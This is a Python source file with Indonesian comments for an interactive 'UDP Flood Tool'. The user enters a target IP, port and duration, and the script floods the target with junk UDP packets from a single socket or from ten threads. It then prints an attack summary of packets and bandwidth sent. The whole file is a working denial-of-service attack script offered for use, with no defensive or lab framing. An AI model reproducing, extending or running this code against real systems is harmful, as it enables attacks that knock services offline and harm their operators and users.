import socket
import time
import threading

def flood(ip, port, duration, use_fast_attack=False):
    """
    Fungsi untuk melakukan flood attack
    use_fast_attack: True untuk versi cepat, False untuk normal
    """
    if use_fast_attack:
        fast_flood(ip, port, duration)
    else:
        normal_flood(ip, port, duration)

def normal_flood(ip, port, duration):
    """Versi normal flood"""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    bytes_to_send = b"A" * 1024  # 1KB data
    timeout = time.time() + duration
    sent_packets = 0
    start_time = time.time()

    while time.time() < timeout:
        try:
            client.sendto(bytes_to_send, (ip, port))
            sent_packets += 1
            if sent_packets % 100 == 0:  # Print setiap 100 paket
                print(f"Sent {sent_packets} packets to {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")
            break

    end_time = time.time()
    total_bytes = sent_packets * 1024
    total_time = end_time - start_time
    
    print(f"\n=== Attack Summary ===")
    print(f"Target: {ip}:{port}")
    print(f"Duration: {duration} seconds")
    print(f"Packets sent: {sent_packets}")
    print(f"Total bytes: {total_bytes} bytes ({total_bytes/1024/1024:.2f} MB)")
    print(f"Average speed: {sent_packets/total_time:.2f} packets/sec")
    print(f"Bandwidth: {total_bytes/total_time/1024/1024:.2f} MB/s")

def fast_flood(ip, port, duration):
    """Versi cepat dengan multiple threads"""
    print(f"Starting FAST FLOOD attack on {ip}:{port} for {duration} seconds")
    
    threads = []
    thread_count = 10  # 10 threads untuk attack cepat
    
    for i in range(thread_count):
        thread = threading.Thread(target=fast_flood_worker, args=(ip, port, duration, i))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"Started worker thread {i+1}")
    
    # Tunggu semua thread selesai
    for thread in threads:
        thread.join()

def fast_flood_worker(ip, port, duration, worker_id):
    """Worker thread untuk fast flood"""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Data yang lebih kecil untuk kecepatan lebih tinggi
    bytes_to_send = b"X" * 512  # 512 bytes
    timeout = time.time() + duration
    sent_packets = 0
    
    while time.time() < timeout:
        try:
            client.sendto(bytes_to_send, (ip, port))
            sent_packets += 1
            if sent_packets % 500 == 0:  # Print lebih jarang
                print(f"Worker {worker_id}: Sent {sent_packets} packets")
        except Exception as e:
            print(f"Worker {worker_id} Error: {e}")
            break
    
    print(f"Worker {worker_id} completed: {sent_packets} packets sent")

def main():
    print("=== UDP Flood Tool ===")
    print("1. Normal Attack")
    print("2. Fast Attack (Multi-thread)")
    
    choice = input("Choose attack type (1/2): ").strip()
    
    target_ip = input("Enter target IP address: ").strip()
    target_port = int(input("Enter target port: ").strip())
    duration = int(input("Enter duration (in seconds): ").strip())
    
    use_fast_attack = (choice == "2")
    
    if use_fast_attack:
        print("\n⚠️  FAST ATTACK MODE ACTIVATED ⚠️")
        print("Using 10 threads for maximum speed!")
    else:
        print("\nStarting NORMAL attack mode...")
    
    # Run the flood function
    print(f"\nStarting attack in 3 seconds...")
    time.sleep(3)
    
    flood(target_ip, target_port, duration, use_fast_attack)
    
    print("\nAttack completed!")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
